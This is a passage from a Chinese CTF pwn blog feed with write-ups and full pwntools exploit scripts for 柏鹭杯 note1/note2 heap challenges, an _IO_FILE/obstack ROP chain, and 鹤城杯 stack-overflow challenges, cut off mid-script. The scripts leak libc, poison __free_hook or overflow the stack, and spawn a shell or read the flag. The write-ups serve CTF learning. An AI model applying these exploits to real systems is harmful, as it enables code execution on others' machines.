p.recvuntil(<span class="hljs-string">b&quot;choise: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>	<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx, content</span>):</span><br>    choose(<span class="hljs-number">3</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&#x27;Message: \n&#x27;</span>)<br>    p.send(content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    choose(<span class="hljs-number">4</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    choose(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: \n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br>p.sendlineafter(<span class="hljs-string">&quot;enter your key &gt;&gt;\n&quot;</span>, <span class="hljs-string">b&#x27;10&#x27;</span>)<br>add(<span class="hljs-number">2</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">2</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">1</span>) <span class="hljs-comment"># 2</span><br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">1</span>) <span class="hljs-comment"># 3 </span><br>add(<span class="hljs-number">1</span>) <span class="hljs-comment"># 4</span><br>add(<span class="hljs-number">1</span>) <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">1</span>) <span class="hljs-comment"># 6</span><br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">5</span>)<br>show(<span class="hljs-number">3</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1f2cc0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %leak)<br>p.recv(<span class="hljs-number">2</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x17f0</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br><br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">3</span>) <span class="hljs-comment"># 7</span><br>add(<span class="hljs-number">1</span>) <span class="hljs-comment"># 8</span><br>add(<span class="hljs-number">1</span>) <span class="hljs-comment"># 9</span><br>free(<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">3</span>) <span class="hljs-comment"># 10</span><br><br>_IO_list_all = leak + <span class="hljs-number">0x1f3660</span><br>chunk_addr = heap_base + <span class="hljs-number">0x1810</span><br>_IO_obstack_jumps = leak + libc.sym[<span class="hljs-string">&#x27;_IO_obstack_jumps&#x27;</span>]<br>gadget = leak + <span class="hljs-number">0x0000000000146020</span> <span class="hljs-comment"># mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0xa81</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)  <span class="hljs-comment"># next_free</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># chunk_limit</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _IO_write_ptr</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_write_end</span><br>fake_IO_FILE += p64(gadget)  <span class="hljs-comment"># call func</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(chunk_addr + <span class="hljs-number">0xe8</span>)  <span class="hljs-comment"># rdiValue</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)  <span class="hljs-comment"># use_extra_arg</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _mode = 0</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xD8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(_IO_obstack_jumps + <span class="hljs-number">0x20</span>)  <span class="hljs-comment"># vtable</span><br>fake_IO_FILE += p64(chunk_addr)<br><br>setcontext = leak + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span><br><span class="hljs-built_in">open</span> = libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>] + leak<br>read = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] + leak <br>write = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>] + leak<br>ret = leak + <span class="hljs-number">0x000000000002d446</span><br>pop_rdi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>))) + leak<br>pop_rsi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>))) + leak<br>pop_rdx = leak + <span class="hljs-number">0x00000000001066e1</span> <span class="hljs-comment"># pop rdx ; pop r12 ; ret</span><br>flag_addr = chunk_addr + <span class="hljs-number">0xf8</span><br>rop_addr = chunk_addr + <span class="hljs-number">0x198</span><br>rop = p64(<span class="hljs-number">0</span>) + p64(chunk_addr + <span class="hljs-number">0xe8</span>) + <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>rop += p64(<span class="hljs-number">0</span>) + p64(setcontext)    <br>rop = rop.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>rop += p64(rop_addr) + p64(ret)<br>rop += p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">open</span>)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span> +  p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span> + p64(write)<br><br>payload = p64(<span class="hljs-number">0</span>) + p64(_IO_list_all - <span class="hljs-number">0x20</span>)<br>payload += fake_IO_FILE<br>payload += rop<br>payload = payload.ljust(<span class="hljs-number">0xa90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xab1</span>) <br>edit(<span class="hljs-number">5</span>, payload)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">3</span>)<br><span class="hljs-comment"># debug(&#x27;b _IO_obstack_xsputn&#x27;)</span><br>choose(<span class="hljs-number">6</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>师傅们真的 yyds ！吹爆了，都好强，我不过是跟在大师傅们后面拾其牙慧罢了，希望也有一天，能拥有属于自己的痕迹吧。</p>
<p>参考文章：</p>
<p><a href="https://www.jianshu.com/p/2e00afb01606">https://www.jianshu.com/p/2e00afb01606</a></p>
<p><a href="https://blog.csdn.net/A951860555/article/details/116425824">https://blog.csdn.net/A951860555/article/details/116425824</a></p>
<p><a href="https://www.cnblogs.com/elvirangel/p/7843842.html">https://www.cnblogs.com/elvirangel/p/7843842.html</a></p>
<p><a href="https://blog.csdn.net/w12315q/article/details/84328447">https://blog.csdn.net/w12315q/article/details/84328447</a></p>
<p><a href="https://www.anquanke.com/post/id/177910">https://www.anquanke.com/post/id/177910</a></p>
<p><a href="https://www.anquanke.com/post/id/177958">https://www.anquanke.com/post/id/177958</a></p>
<p><a href="https://www.anquanke.com/post/id/84987">https://www.anquanke.com/post/id/84987</a></p>
<p><a href="https://xz.aliyun.com/t/5508?spm=5176.12901015.0.i12901015.22a8525cU0EiiN">https://xz.aliyun.com/t/5508?spm=5176.12901015.0.i12901015.22a8525cU0EiiN</a></p>
<p><a href="https://www.anquanke.com/post/id/242640#h3-6">https://www.anquanke.com/post/id/242640#h3-6</a></p>
<p><a href="https://www.anquanke.com/post/id/216290#h3-8">https://www.anquanke.com/post/id/216290#h3-8</a></p>
<p><a href="https://www.anquanke.com/post/id/202387#h2-0">https://www.anquanke.com/post/id/202387#h2-0</a></p>
<p><a href="https://www.anquanke.com/post/id/260614#h3-10">https://www.anquanke.com/post/id/260614#h3-10</a></p>
<p><a href="https://bbs.kanxue.com/thread-273418.htm">https://bbs.kanxue.com/thread-273418.htm</a></p>
<p><a href="https://bbs.kanxue.com/thread-273832.htm">https://bbs.kanxue.com/thread-273832.htm</a></p>
<p><a href="https://bbs.kanxue.com/thread-273863.htm">https://bbs.kanxue.com/thread-273863.htm</a></p>
]]></content>
      <tags>
        <tag>PWN、_IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>2021柏鹭杯</title>
    <url>/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次比赛，一言难尽。惨痛爆0！终归是PWN👶，还需大量学习，不断进步。</p>
<h2 id="note1"><a href="#note1" class="headerlink" title="note1"></a>note1</h2><p>这道题目其实不难，但是比赛时就是一下子没想通，导致一直出不来</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20211103105150568.png"><span class="image-caption">image-20211103105150568</span></p>
<p>一道glibc-2.31下的64位保护全开的堆题</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20211103105100021.png"><span class="image-caption">image-20211103105100021</span></p>
<p>首先会先申请两个堆块，一个存放后续申请的堆块的相关信息，一个用来存放后续申请的堆块的大小和指针</p>
<p>其他的常见功能都具备，不同的地方在于，这题有两种索引方式，一种是正序，一种是逆序。只能对当前堆块进行操作</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20211103160037818.png"><span class="image-caption">image-20211103160037818</span></p>
<p>漏洞点在于释放堆块时，存在UAF</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20211103161126692.png"><span class="image-caption">image-20211103161126692</span></p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20211103163528129-16359285445091.png"><span class="image-caption">image-20211103163528129</span></p>
<p>第二个漏洞点在于申请的0x800的堆块实际上是不够存放堆块指针的，因为最多能申请0x100个，每个信息要0x10，总共要0x1000才够。所以在倒序索引的时候，堆块指针存放的地址是可以被我们申请到的，从而修改存放的堆块指针，获得任意写</p>
<p>而地址泄露则是申请大于0x400的堆块，释放后进入unsorted bin来泄露libc地址</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20211103163650482.png"><span class="image-caption">image-20211103163650482</span></p>
<p>getshell！</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn import *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./note1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.31.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;8.130.170.42&quot;,12031)</span><br>def <span class="hljs-builtin-name">debug</span>():<br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	#gdb.attach(p,<span class="hljs-string">&quot;b *<span class="hljs-variable">$rebase</span>(0x)&quot;</span>)<br><br>def <span class="hljs-builtin-name">add</span>(size,content):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendline(str(size))<br>    p.send(content)<br>	<br>def <span class="hljs-builtin-name">edit</span>(content):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.send(content)<br><br>def show():<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>def free():<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><br>def flip():<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    <br><span class="hljs-builtin-name">add</span>(0x500,<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-builtin-name">add</span>(0x20,<span class="hljs-string">&#x27;b&#x27;</span>)<br>flip()<br>free()<br><span class="hljs-builtin-name">edit</span>(<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br><span class="hljs-builtin-name">add</span>(0x100,<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>x8)<br>show()<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>x8)<br>libc_base = u64(p.recv(6).ljust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 0x1ec010<br>log.<span class="hljs-builtin-name">info</span>(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base) <br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<span class="hljs-built_in"></span><br><span class="hljs-built_in">system </span>= libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-builtin-name">add</span>(0x100,<span class="hljs-string">&#x27;b&#x27;</span>)<br><span class="hljs-builtin-name">add</span>(0x300,<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>x2a0 + p64(0x30) + p64(free_hook - 0x8))<br><br>flip()<br><span class="hljs-builtin-name">debug</span>()<br><span class="hljs-builtin-name">edit</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> + p64(system))<br><br>free()<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="note2"><a href="#note2" class="headerlink" title="note2"></a>note2</h2><p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20211103163800323.png"><span class="image-caption">image-20211103163800323</span></p>
<p>同样是glibc-2.31下的一道64位堆题</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220225163036673.png"><span class="image-caption">image-20220225163036673</span></p>
<p>经典菜单题目，存在申请、删除、打印三个功能</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220225163156584.png"><span class="image-caption">image-20220225163156584</span></p>
<p>add函数，将会申请一个0x20的堆块，可以写入0x10的数据，而主要数据将会再申请一个0x200的堆块进行存放。这里的input函数本来是无法编译出来的。</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220225163336928.png"><span class="image-caption">image-20220225163336928</span></p>
<p>将call的地址修改为函数里面的地址，即可正常编译，看到伪代码。里面不存在问题，就是正常的实现一个输入内容的功能。</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220225163504065.png"><span class="image-caption">image-20220225163504065</span></p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220226131357634.png"><span class="image-caption">image-20220226131357634</span></p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220226131414262.png"><span class="image-caption">image-20220226131414262</span></p>
<p>这里的因为char是有符号的类型，所以可以输入0x80这个特殊的数值，从而让abs函数失效，失效后的传出的数值就是-128，可以让创建的heap地址写入的heap_inuse[0]，heap_inuse[1]上</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220226131554100.png"><span class="image-caption">image-20220226131554100</span></p>
<p>在释放功能里面，只是清空了heap_inuse，其他的堆地址仍然保留</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220226131658741.png"><span class="image-caption">image-20220226131658741</span></p>
<p>那么就可以借助前面的-128导致heap_inuse前面两个是可以通过检验，继而打印出0x200上的数据，所以只要让0x200的堆块上存放着libc地址，即可造成泄露。</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220226132043205.png"><span class="image-caption">image-20220226132043205</span></p>
<p>先释放一连串堆块，填满tcache</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220226154345777.png"><span class="image-caption">image-20220226154345777</span></p>
<p>经过构造，致使两块0x210堆块合并</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220226154457992.png"><span class="image-caption">image-20220226154457992</span></p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220226154516240.png"><span class="image-caption">image-20220226154516240</span></p>
<p>将之前释放的堆块申请回来，最后再申请位于unsorted bin里面的合并堆块，导致前一块的0x200数据堆块可以覆盖到残留的0号堆块的fd、bk指针，到这里，这题就差不多完成了。之后就是申请0x80号堆块，打印出0号堆块数据块上的残留libc地址。之后再利用此时的覆盖数据，在释放0号堆块后，修改其fd指针指向free_hook，最终分配过去修改为system</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220226153827796.png"><span class="image-caption">image-20220226153827796</span></p>
<p>getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./note2&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0x)&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">name, content, flag=<span class="hljs-number">1</span></span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;name: &quot;</span>)<br>    <span class="hljs-keyword">if</span> flag:<br>        p.sendline(name)<br>    <span class="hljs-keyword">else</span>:<br>        p.send(name)<br>    p.recvuntil(<span class="hljs-string">&quot;data: &quot;</span>)<br>    p.sendline(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(p64(<span class="hljs-number">1</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(p64(<span class="hljs-number">1</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(p64(<span class="hljs-number">2</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(p64(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(p64(<span class="hljs-number">3</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(p64(<span class="hljs-number">4</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">3</span>)<br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(p64(<span class="hljs-number">5</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(p64(<span class="hljs-number">6</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(p64(<span class="hljs-number">7</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">7</span>)<br>add(p64(<span class="hljs-number">0x80</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;-&gt; &#x27;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ebbe0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    add(p64(<span class="hljs-number">8</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-comment">#移除一部分tcache</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">6</span>)<span class="hljs-comment">#通过6控制0</span><br>add(p64(<span class="hljs-number">6</span>), <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0xB0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x211</span>)+p64(free_hook))<br>add(p64(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>add(p64(<span class="hljs-number">1</span>), p64(sys))<br>free(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>wp来源：<a href="https://blog.csdn.net/qq_38154820/article/details/118773473">https://blog.csdn.net/qq_38154820/article/details/118773473</a></p>
]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>2021鹤城杯PWN</title>
    <url>/2021/10/08/2021-10-08-2021%E9%B9%A4%E5%9F%8E%E6%9D%AFPWN/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次鹤城杯的题目友善，适合我这种pwn👶玩耍，但是就是这种幼儿园难度，却没能ak，还是太菜了，继续学习吧！迟早👶要变成👴！</p>
<h2 id="babyof"><a href="#babyof" class="headerlink" title="babyof"></a>babyof</h2><p>普通栈溢出，没什么好说的，非常基础的题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;182.116.62.85&quot;</span>,<span class="hljs-number">21613</span>)<br><span class="hljs-comment">#p = process(&#x27;./littleof&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./babyof&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>main = <span class="hljs-number">0x40066b</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x0000000000400743</span><br>ret = <span class="hljs-number">0x0000000000400506</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.sendafter(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,payload)<br>p.recvline()<br>puts = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts)<br><br>libc_base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)<br>p.send(payload)<br>p.recvline()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="littleof"><a href="#littleof" class="headerlink" title="littleof"></a>littleof</h2><p>这题比上面多了个canary的泄露，其他没什么差别，同样是基础栈溢出题目</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;182.116.62.85&quot;</span>,<span class="hljs-number">27056</span>)<br><span class="hljs-comment">#p = process(&#x27;./littleof&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./littleof&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>main = <span class="hljs-number">0x00000000004006E2</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span 